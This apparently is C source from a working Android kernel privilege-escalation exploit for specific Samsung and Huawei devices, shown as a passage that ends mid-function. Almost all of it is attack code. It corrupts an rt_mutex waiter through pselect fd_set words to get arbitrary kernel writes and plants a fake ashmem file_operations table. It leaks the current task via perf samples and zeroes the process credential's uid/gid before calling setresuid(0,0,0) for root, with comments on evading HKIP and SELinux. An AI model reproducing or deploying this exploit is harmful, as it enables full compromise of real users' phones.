#include "common.h"

#ifdef PSELECT_WAITER_LAYOUT_5_10
/* S22U one-punch: leftover TREE is the write.  No phase 0/1, no retry. */
#define PSELECT_CFI_ROUTE_ATTEMPTS 8 /* PATCH(nop): 提高命中率 */
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 24
#endif

atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int cfi_fops_gadget_phase;
int kaslr_done;
int kaslr_step;
uint64_t kaslr_fops_alias;
uint64_t kaslr_open_ptr;
uint64_t kaslr_ioctl_ptr;
uint64_t kaslr_mmap_ptr;
uint64_t kaslr_release_ptr;
uint64_t kaslr_show_fdinfo_ptr;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t kaslr_expected_ioctl;
uint64_t kaslr_expected_mmap;
uint64_t kaslr_expected_release;
uint64_t kaslr_expected_show_fdinfo;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;

static int route_delay_usec(int attempt) {
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * 5.10 overlay places waiter words in out[].  A writable pipe would
   * make POLLOUT ready and pselect would return before sched_setattr.
   * Dup the read end so in/out/ex stay blocked until timeout/punch.
   */
  (void)write_fd;
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_warning("pselect F_DUPFD read errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_read, fd);
    }
  }
  close(high_read);
#else
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_write < 0) {
    pr_warning("pselect F_DUPFD write errno=%d\n", errno);
    return;
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(high_write, fd);
    }
  }
  close(high_write);
#endif
  dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

/* _IO('$', nr) — avoid depending on linux/perf_event.h in the NDK/musl sysroot */
#ifndef PERF_EVENT_IOC_ENABLE
#define PERF_EVENT_IOC_ENABLE  0x2400
#define PERF_EVENT_IOC_DISABLE 0x2401
#define PERF_EVENT_IOC_RESET   0x2403
#endif

int fops_env_int(const char *name, int def);
uintptr_t fops_env_u64(const char *name, uintptr_t def);
/*
 * Leak `current` from a perf sample taken inside __schedule, whose prologue
 * does `mrs x26, sp_el0` (verified in this image: __schedule+0x54).  This
 * removes the ~200-read task-list walk, which was the flakiest step.
 */
static uint64_t gl_leak_current(void) {
  uint8_t attr[128];
  memset(attr, 0, sizeof(attr));
  *(uint32_t *)(attr + 0x00) = 1;             /* PERF_TYPE_SOFTWARE */
  *(uint32_t *)(attr + 0x04) = sizeof(attr);  /* size */
  *(uint64_t *)(attr + 0x08) = 0;             /* PERF_COUNT_SW_CPU_CLOCK */
  *(uint64_t *)(attr + 0x10) = 20000;         /* sample_period (ns) */
  *(uint64_t *)(attr + 0x18) = 1ULL | (1ULL << 18); /* IP | REGS_INTR */
  /* flags: disabled(bit0) | exclude_user(bit4) */
  *(uint64_t *)(attr + 0x28) = 1ULL | (1ULL << 4);
  *(uint32_t *)(attr + 0x30) = 1;             /* wakeup_events */
  *(uint64_t *)(attr + 0x60) = 1ULL << 26;    /* sample_regs_intr = x26 */

  int pfd = (int)syscall(SYS_perf_event_open, attr, 0, -1, -1, 0UL);
  if (pfd < 0) {
    pr_warning("perf open failed errno=%d\n", errno);
    return 0;
  }
  long pg = sysconf(_SC_PAGESIZE);
  size_t data_sz = (size_t)pg * 8;
  uint8_t *ring = mmap(NULL, (size_t)pg + data_sz, PROT_READ | PROT_WRITE,
                       MAP_SHARED, pfd, 0);
  if (ring == MAP_FAILED) {
    pr_warning("perf mmap failed errno=%d\n", errno);
    close(pfd);
    return 0;
  }
  if (ioctl(pfd, PERF_EVENT_IOC_RESET, 0) != 0 ||
      ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0) != 0) {
    pr_warning("perf enable failed errno=%d\n", errno);
    munmap(ring, (size_t)pg + data_sz);
    close(pfd);
    return 0;
  }
  for (int i = 0; i < 40000; i++) {
    sched_yield();
  }
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  uintptr_t sched = text_addr(KIMAGE_TEXT_BASE + SCHEDULE_OFF);
  uintptr_t sched_end = sched + SCHEDULE_SIZE;
  uint64_t found = 0;
  int samples = 0;
  int hits = 0;
  /* struct perf_event_mmap_page: data_head/data_tail/data_offset/data_size
   * live at 0x400/0x408/0x410/0x418 (the header is padded by 116*8 bytes). */
  uint64_t head = __atomic_load_n((uint64_t *)(ring + 0x400), __ATOMIC_ACQUIRE);
  uint64_t tail = *(uint64_t *)(ring + 0x408);
  uint64_t data_off = *(uint64_t *)(ring + 0x410);
  uint64_t real_sz = *(uint64_t *)(ring + 0x418);
  if (!data_off) {
    data_off = (uint64_t)pg;
  }
  if (!real_sz) {
    real_sz = data_sz;
  }
  uint8_t *data = ring + data_off;
  size_t off = 0;
  uint8_t rec[512];
  while (tail < head) {
    size_t pos = (size_t)(tail % real_sz);
    size_t first = real_sz - pos;
    if (first > sizeof(rec)) {
      first = sizeof(rec);
    }
    memcpy(rec, data + pos, first);
    if (first < sizeof(rec) && pos + first == real_sz) {
      size_t rest = sizeof(rec) - first;
      if (rest > (size_t)(head - tail)) {
        rest = (size_t)(head - tail);
      }
      memcpy(rec + first, data, rest);
    }
    uint32_t rsize = *(uint16_t *)(rec + 6);
    uint32_t rtype = *(uint32_t *)rec;
    if (rsize < 8) {
      break;
    }
    if (rtype == 9 /* PERF_RECORD_SAMPLE */) {
      uint8_t flat[512];
      size_t f = real_sz - pos;
      if (pos + rsize <= real_sz) {
        memcpy(flat, data + pos, rsize);
      } else {
        memcpy(flat, data + pos, f);
        memcpy(flat + f, data, rsize - f);
      }
      uint64_t ip = *(uint64_t *)(flat + 8);
      uint64_t abi = *(uint64_t *)(flat + 16);
      uint64_t r0 = *(uint64_t *)(flat + 24);
      uint64_t r1 = *(uint64_t *)(flat + 32);
      uint64_t r2 = *(uint64_t *)(flat + 40);
      uint64_t reg = *(uint64_t *)(flat + 8 + 8 + 8);
      samples++;
      if (ip >= sched && ip < sched_end && samples <= 6) {
        pr_info("perf sample ip_off=0x%zx size=%u abi=%llu r0=%016llx "
                "r1=%016llx r2=%016llx\n",
                (size_t)(ip - sched), rsize, (unsigned long long)abi,
                (unsigned long long)r0, (unsigned long long)r1,
                (unsigned long long)r2);
      }
      /* x26 is loaded from sp_el0 at __schedule+0x54 and is never reloaded,
       * while context_switch rewrites sp_el0 itself -- so only samples after
       * that load and before the first call still have x26 == current. */
      if (ip >= sched + 0x58 && ip < sched + 0x110) {
        hits++;
        found = reg;
        break;
      }
    }
    tail += rsize;
    off += rsize;
  }
  *(uint64_t *)(ring + 0x408) = head;
  pr_info("perf current samples=%d sched_hits=%d cur=%016llx sched=%016zx\n",
          samples, hits, (unsigned long long)found, sched);
  munmap(ring, (size_t)pg + data_sz);
  close(pfd);
  return found;
}

static void run_second_punch(void);

static uint64_t gl_read64(int fd, uintptr_t addr) {
  uint64_t v = 0;
  if (configfs_read_once(fd, addr, &v, sizeof(v)) != (ssize_t)sizeof(v)) {
    return 0;
  }
  return v;
}

/*
 * Walk init_task.tasks with the configfs read primitive.  root.c's
 * find_task_by_tgid() is bound to the pipe physrw reader (root_read64 ->
 * pipe_read64), which does not exist on this route.
 */
static uint64_t gl_find_task_by_tgid(int fd, uint32_t want_tgid) {
  /*
   * Hardened walk: every hop is validated as a direct-map pointer before it
   * is dereferenced, so a torn/garbage list link stops the walk instead of
   * panicking the kernel.
   */
  uintptr_t head = text_addr(INIT_TASK) + TASK_TASKS_OFF;
  uint64_t entry = gl_read64(fd, head);
  for (int i = 0; i < 2048; i++) {
    if (!entry || entry == head) {
      pr_warning("taskwalk: list ended at i=%d entry=%016llx\n", i,
                 (unsigned long long)entry);
      return 0;
    }
    if (!is_direct_ptr(entry)) {
      pr_warning("taskwalk: non-direct link i=%d entry=%016llx\n", i,
                 (unsigned long long)entry);
      return 0;
    }
    uint64_t task = entry - TASK_TASKS_OFF;
    uint64_t pid = gl_read64(fd, task + TASK_PID_OFF);
    if ((uint32_t)pid == want_tgid) {
      pr_info("taskwalk: found tgid=%u at i=%d task=%016llx\n", want_tgid, i,
              (unsigned long long)task);
      return task;
    }
    if ((i % 64) == 0) {
      pr_info("taskwalk i=%d pid=%u entry=%016llx\n", i, (uint32_t)pid,
              (unsigned long long)entry);
    }
    entry = gl_read64(fd, entry);
  }
  pr_warning("taskwalk: iteration cap reached\n");
  return 0;
}

/*
 * Second-write support (HUAWEI GOT-W29 route): one GhostLock walk yields
 * exactly one 8-byte write, and the walk dirties the fake lock it used, so
 * every write needs its own lock slot.  When the override is active the
 * fdset words for tree.__rb_parent_color (written value) and tree.rb_left
 * (written address) are replaced.
 */
int punch_ovr_active;
uintptr_t punch_value_ovr;
uintptr_t punch_target_ovr;
/* One walk dirties the fake lock slot it used, so every walk takes a new one. */
unsigned g_punch_slot;

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

#ifdef PSELECT_WAITER_LAYOUT_5_10
  /*
   * S22U one-child erase on the leftover TREE (in+0x30 = out[1]):
   *   pc = fake_fops (RED), rb_right = 0, rb_left = ASHMEM_MISC_FOPS,
   *   task = fake_task, lock = fake_lock, prio = FAKE_WAITER_PRIO.
   * rb_erase takes the one-child path: rb_set_parent(slot, fake_fops)
   * writes *ASHMEM_MISC_FOPS = fake_fops.  owner stays 0 so other
   * processes' misc_open -> try_module_get(NULL) is a no-op.
   * Collateral: leftover is not actually fake_fops' child, so
   * __rb_change_child's else stores the slot into fake_fops->rb_right
   * (.llseek).  try_cfi_stage repairs it.  RED skips __rb_erase_color.
   * After enqueue, owner==0 wakes leftover.task; fake_task->__state==0
   * so try_to_wake_up bails (INIT_TASK would wake init).
   */
  fdset_put_word(out, 1, fake_fops);
  fdset_put_word(out, 2, 0);
  fdset_put_word(out, 3, text_addr(ASHMEM_MISC_FOPS));
  fdset_put_word(out, 4, 0);
  fdset_put_word(ex, 0, 0);
  fdset_put_word(ex, 1, 0);
  fdset_put_word(ex, 2, fake_task);
  fdset_put_word(ex, 3, fake_lock);
  fdset_put_word(ex, 4, FAKE_WAITER_PRIO);
  pr_info("one-punch leftover pc=%016zx left=%016zx task=%016zx lock=%016zx prio=%d\n",
          fake_fops, text_addr(ASHMEM_MISC_FOPS), fake_task, fake_lock,
          FAKE_WAITER_PRIO);
  /*
   * Diagnostic switch: PUNCH_VARIANT=3 zeroes the erasing node's
   * __rb_parent_color (the value rb_erase would store), so the whole
   * walk stays identical but the write becomes harmless.
   */
  int punch_variant = fops_env_int("PUNCH_VARIANT", 1);
  if (punch_variant == 3) {
    fdset_put_word(out, 1, 0);
  }
  if (punch_variant == 2) {
    /*
     * Point waiter->lock at an untouched (all-zero) rt_mutex_base inside
     * the same page.  owner==0 makes the chain walk bail at its first
     * owner test, before any rb-tree access.
     */
    fdset_put_word(ex, 3, fake_lock + 0x100);
  }
  if (punch_ovr_active) {
    /* word0 = tree.__rb_parent_color (value), word2 = tree.rb_left (target) */
    fdset_put_word(out, 1, punch_value_ovr);
    fdset_put_word(out, 3, punch_target_ovr);
  }
  pr_info("one-punch variant=%d\n", punch_variant);
#else
  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
#endif
}

int fops_env_int(const char *name, int def) {
  const char *s = getenv(name);
  if (!s || !*s) {
    return def;
  }
  long v = strtol(s, NULL, 0);
  if (v < 0) {
    v = 0;
  }
  if (v > 5000000) {
    v = 5000000;
  }
  return (int)v;
}

uintptr_t fops_env_u64(const char *name, uintptr_t def) {
  const char *s = getenv(name);
  if (!s || !*s) {
    return def;
  }
  return (uintptr_t)strtoull(s, NULL, 0);
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("pselect route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;
#ifdef PSELECT_WAITER_LAYOUT_5_10
  cfi_fops_gadget_phase = 1;
  int pre_punch_fd = open(ashmem_path, O_RDWR | O_CLOEXEC);
  int pre_punch_open_errno = pre_punch_fd < 0 ? errno : 0;
  pr_info("ashmem pre-punch fd=%d errno=%d\n", pre_punch_fd, pre_punch_open_errno);
  probe_ashmem_ioctl("pre-punch-new", -1);
  probe_ashmem_ioctl("pre-punch-kept", pre_punch_fd);
#endif
  for (int route_attempt = 1; route_attempt <= PSELECT_CFI_ROUTE_ATTEMPTS;
       route_attempt++) {
    if (route_attempt != 1) {
#ifdef PSELECT_WAITER_LAYOUT_5_10
      /* Keep the planted skb page; a new KernelSnitch spray reclaims it. */
#else
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("pselect retry page prepare failed attempt=%d base=%016zx "
                 "lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
#endif
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
    if (high_read < 0) {
      cfi_last_step = 31;
      cfi_last_errno = errno;
      pr_error("pselect F_DUPFD read errno=%d\n", errno);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
#ifdef PSELECT_WAITER_LAYOUT_5_10
    /*
     * The consumer must punch only after this thread is already inside
     * pselect(), i.e. after core_sys_select copied the fd_sets onto the
     * reused waiter frame.  Punching earlier walks the untouched leftover
     * waiter and oopses, so keep the upstream entry delay.
     */
    int delay_usec = fops_env_int("PSELECT_DELAY_USEC", PSELECT_ENTER_DELAY_USEC * 5);
#else
    int delay_usec = route_delay_usec(route_attempt);
#endif
    atomic_store(&main_route_delay_usec, delay_usec);
    atomic_store(&punch_consume_go, route_attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    struct timespec *timeoutp = &timeout;

    pr_info("pselect entering nfds=%d delay=%d call=%d\n", PSELECT_ROUTE_NFDS,
            delay_usec, calls);
    errno = 0;
    int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
    int saved_errno = errno;
    /*
     * Chain walk in sched_setattr can outlive a short pselect.  Wait for
     * the punch to finish before dropping the overlay decision, then
     * always try the fops pre-check.
     */
    for (int wait_n = 0; wait_n < 400; wait_n++) {
      calls = atomic_load(&consumer_calls);
      success = atomic_load(&consumer_success);
      if (success > 0) {
        break;
      }
      usleep(10000);
    }
    atomic_store(&punch_consume_go, 0);
    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d "
            "one-punch w0=%016zx lock=%016zx fops=%016zx task=%016zx\n",
            route_attempt, ret, saved_errno, calls, success, delay_usec,
            fake_w0, fake_lock, fake_fops, fake_task);

    int route_signal = calls > 0;
#ifdef PSELECT_WAITER_LAYOUT_5_10
    if (success == 0) {
      pr_info("pselect fops gadget punch miss; one-punch, no retry\n");
      close(high_read);
      close(pipefd[0]);
      close(pipefd[1]);
      break;
    }
    stop_punch_for_pipe();
    probe_ashmem_ioctl("post-punch-kept", pre_punch_fd);
    probe_ashmem_ioctl("post-punch-new", -1);
#endif
    if (try_cfi_stage()) {
      cfi_last_step = 0;
      route_verified = 1;
    } else if (!cfi_last_step) {
      cfi_last_step = route_signal ? 32 : 33;
      cfi_last_errno = saved_errno;
    }

    close(high_read);
    close(pipefd[0]);
    close(pipefd[1]);

    if (route_verified || cfi_dirty_seen || !route_signal) {
      break;
    }
#ifdef PSELECT_WAITER_LAYOUT_5_10
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; keeping planted page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
#else
    pr_info("pselect cfi miss attempt=%d/%d step=%d errno=%d; refreshing FOPS page\n",
            route_attempt, PSELECT_CFI_ROUTE_ATTEMPTS, cfi_last_step,
            cfi_last_errno);
#endif
  }
  stop_punch_for_pipe();
#ifdef PSELECT_WAITER_LAYOUT_5_10
  if (pre_punch_fd >= 0) {
    close(pre_punch_fd);
  }
#endif
  pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
          calls, success, cfi_last_step, cfi_last_errno);
}

/*
 * One GhostLock walk = one 8-byte write, and it dirties the fake lock it
 * used, so a second write must take a fresh lock slot.  Shape used here is
 * the "zero" form (HUAWEI GOT-W29 TECHNICAL.md): tree = {pc=0, right=0,
 * left=target} -> parent==NULL so rb_erase takes Case 2 with no collateral
 * and stores 0 at target.
 */
static void run_second_punch(void) {
  static int already_done;
  if (already_done || !fops_env_int("PUNCH2", 0)) {
    return;
  }
  already_done = 1;
  uintptr_t target = fops_env_u64("PUNCH2_TARGET", 0);
  uintptr_t value = fops_env_u64("PUNCH2_VALUE", 0);
  if (target == 1) {
    /* Scratch inside our own planted page: verifies the write shape
     * without touching live kernel state. */
    target = fake_fops + 0x700;
    uint64_t pre = 0;
    int pfd = open_ashmem_device();
    if (pfd >= 0) {
      configfs_read_once(pfd, target, &pre, sizeof(pre));
      close(pfd);
    }
    pr_info("punch2 scratch target=%016zx pre=%016llx\n", target,
            (unsigned long long)pre);
  }
  int cred_mode = fops_env_int("PUNCH2_CRED", 0);
  if (cred_mode) {
    /*
     * Liveness gate: the second walk is only safe while the planted page is
     * still ours.  fake_task+0x9d0 holds a self-pointer we wrote, and a
     * fresh lock slot must still have an empty waiters tree.  A miss means a
     * recycled page, where the walk would dereference garbage and panic, so
     * skip instead of punching.
     */
    int gfd = open_ashmem_device();
    if (gfd < 0) {
      pr_error("punch2 gate: no ashmem fd errno=%d\n", errno);
      return;
    }
    uint64_t canary = gl_read64(gfd, fake_fops + FOPS_OPEN_OFF);
    close(gfd);
    pr_info("punch2 gate fops.open=%016llx want=%016zx slot=%u\n",
            (unsigned long long)canary, (size_t)text_addr(ASHMEM_OPEN),
            g_punch_slot);
    if (canary != (uint64_t)text_addr(ASHMEM_OPEN)) {
      pr_error("punch2 gate: fake fops table gone; skip walk2\n");
      return;
    }
  }
  if (cred_mode) {
    /*
     * HUAWEI GOT-W29 route: zero uid+gid on the live cred, then let the
     * kernel produce a legal root cred via setresuid(0,0,0).  No cred
     * pointer swap, no SELinux change, so HKIP stays quiet.
     */
    int cfd = open_ashmem_device();
    if (cfd < 0) {
      pr_error("punch2 cred: no ashmem fd errno=%d\n", errno);
      return;
    }
    /*
     * Cheapest reliable source of `current`: mm->owner (offset 0x330, from
     * mm_update_next_owner).  The exploit already leaked this process's
     * mm_struct via KernelSnitch, so this costs exactly two 8-byte reads
     * instead of a ~200-read task-list walk that trips HARDENED_USERCOPY
     * when the name blob state goes stale.
     */
    uint64_t task = 0;
    uintptr_t mmaddr = current_kernelsnitch_mm_struct();
    pr_info("mmowner mm=%016zx direct=%d\n", (size_t)mmaddr,
            is_direct_ptr(mmaddr));
    if (is_direct_ptr(mmaddr)) {
      uint64_t owner = 0;
      ssize_t on = configfs_read_once(cfd, mmaddr + MM_OWNER_OFF, &owner,
                                      sizeof(owner));
      task = owner;
      pr_info("mmowner read=%zd owner=%016llx\n", on,
              (unsigned long long)owner);
    }
    if (!task && fops_env_int("PUNCH2_PERF", 0)) {
      task = gl_leak_current();
    }
    {
      /* The long perf spin gives the allocator time to recycle the planted
       * page; re-check liveness before the reads below rely on the hijack. */
      int rfd = open_ashmem_device();
      if (rfd < 0) {
        pr_error("punch2 regate: no ashmem fd\n");
        return;
      }
      uint64_t rc = gl_read64(rfd, fake_task + 0x9d0);
      close(rfd);
      pr_info("punch2 regate canary=%016llx want=%016zx\n",
              (unsigned long long)rc, (size_t)fake_task);
      if (rc != (uint64_t)fake_task) {
        pr_error("punch2 regate: planted page gone; skipping\n");
        return;
      }
    }
    if (task && !is_direct_ptr(task)) {
      pr_warning("perf current not a direct ptr; discarding\n");
      task = 0;
    }
    if (task && fops_env_int("PUNCH2_READCOMM", 0)) {
      char comm[17] = {0};
      ssize_t cn = configfs_read_once(cfd, task + TASK_COMM_OFF, comm, 16);
      pr_info("perf current comm ret=%zd val=%.16s\n", cn, comm);
      if (cn != 16 ||
          (strncmp(comm, "glhw", 4) != 0 && strncmp(comm, "ghost", 5) != 0)) {
        pr_warning("perf current comm mismatch; discarding\n");
        task = 0;
      }
    }
    if (!task && fops_env_int("PUNCH2_TASKWALK", 0)) {
      task = gl_find_task_by_tgid(cfd, (uint32_t)getpid());
    }
    uint64_t cred = 0;
    if (task && fops_env_int("PUNCH2_READCRED", 0)) {
      uint64_t raw = 0;
      ssize_t rn = configfs_read_once(cfd, task + TASK_CRED_OFF, &raw,
                                      sizeof(raw));
      cred = raw;
      pr_info("punch2 credread ret=%zd val=%016llx\n", rn,
              (unsigned long long)raw);
    }
    close(cfd);
    pr_info("punch2 cred task=%016llx cred=%016llx\n",
            (unsigned long long)task, (unsigned long long)cred);
    if (!task || !is_direct_ptr(cred)) {
      pr_error("punch2 cred lookup failed (task=%016llx cred=%016llx)\n",
               (unsigned long long)task, (unsigned long long)cred);
      return;
    }
    target = (uintptr_t)cred + CRED_UID_OFF;
  }
  if (!target) {
    pr_error("punch2: no target\n");
    return;
  }
  unsigned slot = (unsigned)fops_env_int("PUNCH2_SLOT", 1);
  uintptr_t saved_lock = fake_lock;
  punch_ovr_active = 1;
  punch_value_ovr = value;
  punch_target_ovr = target;
  pr_info("punch2 begin slot=%u lock=%016zx target=%016zx value=%016zx\n",
          slot, fake_lock, target, value);

  int pipefd[2];
  if (pipe(pipefd) != 0) {
    pr_error("punch2 pipe errno=%d\n", errno);
    goto restore;
  }
  int high_read = fcntl(pipefd[0], F_DUPFD, PSELECT_ROUTE_NFDS + 16);
  if (high_read < 0) {
    pr_error("punch2 F_DUPFD errno=%d\n", errno);
    close(pipefd[0]);
    close(pipefd[1]);
    goto restore;
  }
  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_pselect_fdsets(&in, &out, &ex);
  open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC * 5);
  atomic_store(&punch_consume_go, 1);
  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  errno = 0;
  int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
  int saved_errno = errno;
  for (int n = 0; n < 400; n++) {
    if (atomic_load(&consumer_success) > 0) {
      break;
    }
    usleep(10000);
  }
  atomic_store(&punch_consume_go, 0);
  pr_info("punch2 ret=%d errno=%d calls=%d success=%d\n", ret, saved_errno,
          atomic_load(&consumer_calls), atomic_load(&consumer_success));
  close(high_read);
  close(pipefd[0]);
  close(pipefd[1]);

  int fd = open_ashmem_device();
  if (fd >= 0) {
    uint64_t rb = 0;
    ssize_t n = configfs_read_once(fd, target, &rb, sizeof(rb));
    pr_info("punch2 readback ret=%zd got=%016llx expect=%016zx\n", n,
            (unsigned long long)rb, value);
    close(fd);
  }
  if (cred_mode) {
    /*
     * uid/gid are now zero on the live cred.  setresuid/setresgid do not
     * need CAP_SETUID because every requested id equals the current one,
     * and the kernel builds a fresh cred (prepare_creds/commit_creds)
     * that keeps this task's SELinux SID.
     */
    errno = 0;
    int rg = setresgid(2000, 2000, 2000);
    int rg_errno = errno;
    errno = 0;
    int ru = setresuid(0, 0, 0);
    int ru_errno = errno;
    char ctx[64] = {0};
    int cfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
    if (cfd >= 0) {
      ssize_t n = read(cfd, ctx, sizeof(ctx) - 1);
      if (n > 0) {
        ctx[n < (ssize_t)sizeof(ctx) ? n : (ssize_t)sizeof(ctx) - 1] = 0;
        for (ssize_t i = 0; i < n; i++) {
          if (ctx[i] == '\n') {
            ctx[i] = 0;
            break;
          }
        }
      }
      close(cfd);
    }
    pr_info("punch2 root setresgid=%d/%d setresuid=%d/%d "
            "uid=%d euid=%d gid=%d egid=%d ctx=%s\n",
            rg, rg_errno, ru, ru_errno, getuid(), geteuid(), getgid(),
            getegid(), ctx);
  }

restore:
  punch_ovr_active = 0;
  fake_lock = saved_lock;
}

int repair_fake_fops_llseek(int fd) {
  uint64_t llseek = text_addr(NOOP_LLSEEK);
  uint64_t after = 0;
  uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
  {
    /* Does the configfs write path land in buffer->bin_buffer at all? */
    uint64_t sv = 0x4142434445464748ULL;
    uintptr_t scratch = fake_fops + 0x20;
    ssize_t swr = configfs_write_once(fd, scratch, &sv, sizeof(sv));
    uint64_t sgot = 0;
    ssize_t srd = configfs_read_once(fd, scratch, &sgot, sizeof(sgot));
    pr_info("cfi write selftest scratch=%016zx wr=%zd rd=%zd got=%016llx "
            "want=%016llx\n",
            scratch, swr, srd, (unsigned long long)sgot,
            (unsigned long long)sv);
    {
      unsigned char raw[0x40];
      memset(raw, 0, sizeof(raw));
      /* cfi page dump removed 2026-11-12: the selftest above already proves the
       * write, and the bytes are needed for the module-load probe. */
      (void)raw;
    }
  }
  uint64_t pre = 0;
  uint64_t read_slot = 0;
  ssize_t prd = configfs_read_once(fd, slot, &pre, sizeof(pre));
  ssize_t rrd =
    configfs_read_once(fd, slot + FOPS_READ_OFF - FOPS_LLSEEK_OFF,
                       &read_slot, sizeof(read_slot));
  ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
  ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
  pr_info("cfi llseek repair slot=%016zx want=%016llx pre=%016llx(prd=%zd) "
          "readslot=%016llx(rrd=%zd) wr=%zd rd=%zd got=%016llx\n",
          slot, (unsigned long long)llseek, (unsigned long long)pre, prd,
          (unsigned long long)read_slot, rrd, wr, rd,
          (unsigned long long)after);
  return wr == (ssize_t)sizeof(llseek) &&
         rd == (ssize_t)sizeof(after) &&
         after == llseek;
}

int refresh_fake_fops_text(int fd) {
  struct fops_slot {
    size_t off;
    uint64_t value;
  } slots[] = {
#ifdef CONFIGFS_USE_FILE_RW
    {FOPS_READ_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#else
    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
#endif
    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
  };

  for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
    uintptr_t target = fake_fops + slots[i].off;
    if (kernel_write_data(fd, target, &slots[i].value,
        sizeof(slots[i].value)) !=
        (ssize_t)sizeof(slots[i].value)) {
      return 0;
    }
  }
  return 1;
}

int leak_kernel_base(int fd) {
  kaslr_fops_alias = p0_data_alias(ASHMEM_FOPS);
  kaslr_open_ptr = kernel_read64(fd, kaslr_fops_alias + FOPS_OPEN_OFF);
